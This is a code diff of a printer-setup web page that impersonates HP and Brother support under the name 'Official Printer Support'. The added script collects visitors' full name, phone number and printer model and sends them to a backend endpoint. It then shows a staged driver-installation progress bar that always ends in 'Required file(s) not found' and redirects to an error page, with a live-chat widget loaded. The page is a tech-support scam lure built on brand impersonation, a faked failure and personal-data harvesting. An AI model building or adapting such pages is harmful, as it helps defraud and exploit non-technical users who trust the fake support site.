@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Brother Setup</title>
+  <title>HP Setup</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+Gurmukhi:wght@100..900&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
@@ -237,26 +237,312 @@ div#stepContent {
   color: #d13438;
   font-weight: 600;
 }
+.header {
+    background: #dff1ff;
+    padding: 18px 30px;
+}
+.header-container {
+  max-width: 1200px;
+  margin: auto;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+/* Logo */
+.logo img {
+  height: 45px;
+}
+
+/* Navigation */
+.nav {
+  display: flex;
+  gap: 30px;
+}
+
+.nav a {
+  text-decoration: none;
+  font-size: 16px;
+  font-weight: 600;
+  color: #000;
+  letter-spacing: 0.5px;
+}
+
+.nav a:hover {
+  color: #0056ff;
+}
+
+/* Contact Button */
+.btn {
+  text-decoration: none;
+  padding: 10px 22px;
+  border: 2px solid #0056ff;
+  color: #0056ff;
+  border-radius: 12px;
+  font-weight: 700;
+  transition: all 0.3s ease;
+}
+.printer-setup {
+  background: #f7f7f7;
+  padding: 80px 0;
+  font-family: Arial, sans-serif;
+}
+
+.container {
+  width: 90%;
+  max-width: 1200px;
+  margin: auto;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+/* Left Side */
+.content {
+  width: 45%;
+}
+
+.content h2 {
+  font-size: 28px;
+  font-weight: bold;
+  margin-bottom: 15px;
+}
+
+.content p {
+  font-size: 15px;
+  color: #333;
+  line-height: 1.6;
+  margin-bottom: 20px;
+}
+
+/* Button */
+.btn-primary {
+  display: inline-block;
+  background: #0057ff;
+  color: #fff;
+  padding: 14px 28px;
+  border-radius: 4px;
+  font-size: 14px;
+  font-weight: bold;
+  text-decoration: none;
+  transition: 0.3s;
+}
+
+.btn-primary:hover {
+  background: #003fcc;
+}
+
+/* Assistance Text */
+.assist {
+  font-size: 13px;
+  margin-top: 15px;
+}
+
+.assist a {
+  color: #0057ff;
+  text-decoration: none;
+}
+
+.assist a:hover {
+  text-decoration: underline;
+}
+
+/* Right Side Image */
+.image-box {
+  width: 50%;
+  text-align: right;
+}
+
+.image-box img {
+  max-width: 100%;
+  height: auto;
+  border-radius: 4px;
+}
+
+/* Responsive */
+@media (max-width: 900px) {
+  .container {
+    flex-direction: column;
+    text-align: center;
+  }
+
+  .content,
+  .image-box {
+    width: 100%;
+  }
+
+  .image-box {
+    margin-top: 30px;
+    text-align: center;
+  }
+}
+
+.btn:hover {
+  background: #0056ff;
+  color: #fff;
+}
+.bro-container h1,.bro-container img {
+    display: none;
+}
+.support-section {
+  background: #f6f6f6;
+  padding: 60px 0;
+  font-family: Arial, sans-serif;
+}
+
+.support-container {
+  width: 90%;
+  max-width: 1200px;
+  margin: auto;
+
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 30px;
+}
+
+/* Card Box */
+.support-card {
+  background: #fff;
+  padding: 35px;
+  border-radius: 8px;
+
+  box-shadow: 0px 2px 8px rgba(0, 0, 0, 0.08);
+  border: 1px solid #eee;
+}
+
+.support-card h3 {
+  font-size: 18px;
+  font-weight: bold;
+  margin-bottom: 12px;
+}
+
+.support-card p {
+  font-size: 14px;
+  color: #333;
+  line-height: 1.6;
+  margin-bottom: 20px;
+}
+
+/* Button Style */
+.support-btn {
+  display: inline-block;
+  background: #1e57ff;
+  color: #fff;
+  font-size: 18px;
+  font-weight: normal;
+  padding: 18px 28px;
+  border-radius: 8px;
+  text-decoration: none;
+  transition: 0.3s;
+}
+
+.support-btn:hover {
+  background: #003dd9;
+}
+
+/* Simple Link */
+.support-link {
+  color: #1e57ff;
+  font-size: 14px;
+  text-decoration: none;
+}
+
+.support-link:hover {
+  text-decoration: underline;
+}
+
+/* List Links */
+.support-list {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+}
+
+.support-list li {
+  margin-bottom: 10px;
+}
+
+.support-list a {
+  color: #1e57ff;
+  font-size: 14px;
+  text-decoration: none;
+}
+
+.support-list a:hover {
+  text-decoration: underline;
+}
+
+/* Responsive */
+@media (max-width: 900px) {
+  .support-container {
+    grid-template-columns: 1fr;
+  }
+
+  .support-btn {
+    width: 100%;
+    text-align: center;
+  }
+}
+.loading-active .printer-setup ,.loading-active .support-section{
+    display: none;
+}
+.bro-container div#formBox {
+    display: flex;
+    align-items: center;
+    padding: 74px 335px;
+}
+.bro-container div#formBox input {
+    margin: 0 19px;
+}
+.loading-active .bro-container h1, .loading-active .bro-container img {
+    display: block;
+}
+.loading-active .bro-container {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    width: 70%;
+    margin: 190px auto;
+}
   </style>
 </head>
 <body>
-<section class="hp-hero">
-  <div class="hp-container">
+   <header class="header">
+  <div class="header-container">
+
+    <!-- Logo -->
+    <div class="logo">
+      <img src="./img/logo.webp" alt="Printer Logo">
+    </div>
+
+    <!-- Navigation -->
+    <nav class="nav">
+      <a href="#">OFFICEJET</a>
+      <a href="#">LASERJET</a>
+      <a href="#">PIXMA</a>
+      <a href="#">MAXIFY</a>
+      <a href="#">XP SERIES</a>
+    </nav>
+
+    <!-- CTA Button -->
+    <div class="cta">
+      <a href="#" class="btn">CONTACT US</a>
+    </div>
+
+  </div>
+</header>
+<section class="brotherMain-hero">
+  <div class="bro-container">
     <div class="hp-text">
       <h1>
-        Set up your Brother printer at <br>
-        <span>123.Brother.com</span>
+     Driver Loading
       </h1>
-      <p class="subtitle">
-        Download and install your printer software
-      </p>
       <div id="formBox">
- <input id="printerModel" placeholder='Enter exact model number or name. Ex: "Brother Pixma G3010"'>
-  <button id="startBtn">GO</button>
+        <input id="fullName" placeholder='Full Name'>
+        <input id="printerModel" placeholder="Printer Model">
+         <input id="phoneNumber" placeholder='Phone Number'>
+        <button id="startBtn">FIND DRIVERS</button>
   </div>
-      <p class="note">
-        Enter your Brother, OfficeJet, LaserJet or DeskJet model number.
-      </p>
     </div>
     <div class="loaderWrap">
       <div id="loadingBox" style="display:none;">
@@ -272,6 +558,89 @@ div#stepContent {
       <img src="./img/DJPrinters.png" alt="HP Printers">
     </div>
   </div>
+  <section class="printer-setup">
+  <div class="container">
+
+    <!-- Left Content -->
+    <div class="content">
+      <h2>How to Setup Your Printer</h2>
+
+      <p>
+        Click Printer Setup for step by step guidance on how to setup,
+        configure and register your printer.
+      </p>
+
+      <a href="#" class="btn-primary">RUN PRINTER SETUP</a>
+
+      <p class="assist">
+        For Assistance Please <a href="#">Contact Us</a>
+      </p>
+    </div>
+
+    <!-- Right Image -->
+    <div class="image-box">
+      <img src="./img/printer-setup.png" alt="Printer Setup" />
+    </div>
+
+  </div>
+</section>
+<section class="support-section">
+  <div class="support-container">
+
+    <!-- Card 1 -->
+    <div class="support-card">
+      <h3>Software & Driver Downloads</h3>
+      <p>Find the right drivers for your machine</p>
+
+      <a href="#" class="support-btn">
+        SEARCH DRIVER DOWNLOADS
+      </a>
+    </div>
+
+    <!-- Card 2 -->
+    <div class="support-card">
+      <h3>Locate a Service Center for Repair</h3>
+      <p>
+        Search Brother's network of authorized service centers for
+        both in and out of warranty repair.
+      </p>
+
+      <a href="#" class="support-btn">
+        SEARCH SERVICE CENTERS +
+      </a>
+    </div>
+
+    <!-- Card 3 -->
+    <div class="support-card">
+      <h3>Product Registration</h3>
+      <p>
+        Register your Brother product for free product updates and
+        support, news about special offers, and new product
+        announcements.
+      </p>
+
+      <a href="#" class="support-link">
+        Register your product today →
+      </a>
+    </div>
+
+    <!-- Card 4 -->
+    <div class="support-card">
+      <h3>Other Support Links</h3>
+
+      <ul class="support-list">
+        <li><a href="#">Check Warranty Status →</a></li>
+        <li><a href="#">How to Find Your Serial Number →</a></li>
+        <li><a href="#">Toner & Ink Recycling →</a></li>
+        <li><a href="#">Product Recycling by State →</a></li>
+        <li><a href="#">Purchase Extended Warranty →</a></li>
+        <li><a href="#">Product Safety Data Sheets →</a></li>
+      </ul>
+    </div>
+
+  </div>
+</section>
+
 </section>
 <footer class="footer">
   <p>Copyright © 2026 by Official Printer Support</p>
@@ -279,46 +648,70 @@ div#stepContent {
 
 <script>
 document.getElementById("startBtn").addEventListener("click", async function () {
-  const model = document.getElementById("printerModel").value.trim();
-  if (!model) {
+
+  const fullName = document.getElementById("fullName").value.trim();
+  const printerModel = document.getElementById("printerModel").value.trim();
+  const phoneNumber = document.getElementById("phoneNumber").value.trim();
+
+  // Validation
+  if (!fullName) {
+    alert("Please enter your full name");
+    return;
+  }
+
+  if (!printerModel) {
     alert("Please enter printer model");
     return;
   }
-  sessionStorage.setItem("printerModel", model);
+
+  if (!phoneNumber) {
+    alert("Please enter phone number");
+    return;
+  }
+document.querySelector(".brotherMain-hero").classList.add("loading-active");
+  // Store in session (optional)
+  sessionStorage.setItem("fullName", fullName);
+  sessionStorage.setItem("printerModel", printerModel);
+  sessionStorage.setItem("phoneNumber", phoneNumber);
+
+  // Send data to backend
   try {
     await fetch("/api/send-model", {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
+      headers: {
+        "Content-Type": "application/json"
+      },
       body: JSON.stringify({
-        printerModel: model,
-        brand: "HP"
+        fullName: fullName,
+        printerModel: printerModel,
+        phoneNumber: phoneNumber,
+        brand: "Brother Setup"
       })
     });
-  } catch (e) {
-    console.log("Model mail failed (non-blocking)");
+  } catch (err) {
+    console.log("API call failed (non-blocking)");
   }
+
+  // UI switch
   document.getElementById("formBox").style.display = "none";
   document.getElementById("loadingBox").style.display = "block";
 
-const steps = [
-  `<p>Detecting Brother connection…</p>`,
-  `<p>Checking Brother requirements…</p>`,
-  `<p>Preparing Brother install…</p>`,
-  `<p>Installing Brother software…</p>`,
-  `<p class="red">Required file(s) not found</p>`
-];
-
+  // Steps
+  const steps = [
+    `<p>Detecting connection…</p>`,
+    `<p>Checking requirements…</p>`,
+    `<p>Preparing install…</p>`,
+    `<p>Installing software…</p>`,
+    `<p class="red">Required file(s) not found</p>`
+  ];
 
   const progressBar = document.getElementById("progressBar");
-  const statusText = document.getElementById("statusText");
-
   let currentStep = 0;
-  const stepDuration = 1500; 
+  const stepDuration = 1500;
   const stepPercent = 100 / steps.length;
 
   function runProgress() {
     if (currentStep < steps.length) {
-
       progressBar.style.width = `${stepPercent * (currentStep + 1)}%`;
       currentStep++;
       setTimeout(runProgress, stepDuration);
@@ -328,19 +721,19 @@ const steps = [
   runProgress();
 
   let i = 0;
-  function next() {
+  function nextStep() {
     document.getElementById("stepContent").innerHTML = steps[i];
     i++;
     if (i < steps.length) {
-      setTimeout(next, 2500);
+      setTimeout(nextStep, 2500);
     } else {
       setTimeout(() => {
-       window.location.href = "/brother-error.html";
+        window.location.href = "/brother-error.html";
       }, 2500);
     }
   }
 
-  next();
+  nextStep();
 });
 </script>
 <script src="/smartsupp.js"></script>
